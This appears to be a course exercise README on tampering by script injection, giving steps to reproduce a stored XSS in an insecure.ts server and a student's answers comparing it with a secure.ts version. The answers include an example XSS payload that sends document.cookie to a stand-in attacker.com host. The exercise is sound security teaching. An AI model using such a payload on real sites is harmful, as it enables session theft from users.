# Tampering

This example demonstrates tampering through script injection.

## Steps to reproduce

1. Install all dependencies

    `npm install`

2. Start the **insecure.ts** server

    `npx ts-node insecure.ts`

3. In the browser, type a potentially malicious script in the name field of the form

    ```
        <script> document.body.innerHTML = "<a href='https://google.com'> Gotcha </a>"</script>
    ```

4. Do you see the potentially malicious hyperlink being injected into the form?

## For you to do

Answer the following:

1. Briefly explain the potential vulnerabilities in **insecure.ts**
2. Briefly explain how a malicious attacker can exploit them.
3. Briefly explain why **secure.ts** does not have the same vulnerabilties?



1. Potential Vulnerabilities in insecure.ts

Cross-Site Scripting (XSS) - The /register route doesn't sanitize user input before storing it in the session and rendering it back to the page.

Missing CSRF Protection - There's no implementation of CSRF tokens to prevent cross-site request forgery attacks.

Session Security Issues - While some cookie security settings are implemented, they don't include the 'secure' flag to restrict cookies to HTTPS.

2. How an Attacker Can Exploit These Vulnerabilities

XSS Attack - An attacker could submit a name like <script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>. When any user visits the homepage, this script would execute and send the user's session cookie to the attacker's server.

CSRF Attack - An attacker could create a malicious website that contains a form automatically submitting to your /register or /sensitive endpoints, performing actions on behalf of authenticated users without their knowledge.

Session Hijacking - Without the 'secure' flag, session cookies might be transmitted over unencrypted connections, allowing attackers to intercept them through network sniffing.

3. Why secure.ts Doesn't Have the Same Vulnerabilities

XSS Prevention - secure.ts implements the escapeHTML() function that sanitizes user input by escaping HTML special characters, preventing script injection.

Better Input Handling - The sanitized input is stored in the session, ensuring that any malicious script tags are rendered as text rather than being executed when displayed.

Same Security Improvements - While secure.ts still lacks CSRF protection and the 'secure' cookie flag, the critical XSS vulnerability has been addressed, significantly reducing the attack surface.